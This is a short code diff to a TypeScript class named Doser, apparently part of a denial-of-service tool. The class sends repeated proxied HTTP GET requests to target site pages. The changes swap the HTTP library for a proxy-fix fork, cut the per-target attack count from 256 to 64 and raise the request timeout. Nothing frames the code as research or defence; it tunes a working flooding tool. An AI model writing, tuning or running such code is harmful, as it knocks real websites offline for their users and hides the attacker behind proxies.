@@ -1,4 +1,4 @@
-import axios, { AxiosError } from 'axios'
+import axios, { AxiosError } from 'axios-https-proxy-fix'
 import { EventEmitter } from 'events'
 
 interface ProxyData {
@@ -159,7 +159,7 @@ export class Doser {
         }
       }
 
-      const ATACKS_PER_TARGET = 256
+      const ATACKS_PER_TARGET = 64
 
       let proxy = null
       for (let atackIndex = 0; (atackIndex < ATACKS_PER_TARGET) && this.working; atackIndex++) {
@@ -179,7 +179,7 @@ export class Doser {
             const proxyPassword = proxyAuthSplit[1]
 
             const r = await axios.get(target.site.page, {
-              timeout: 5000,
+              timeout: 10000,
               validateStatus: () => true,
               proxy: {
                 host: proxyIP,
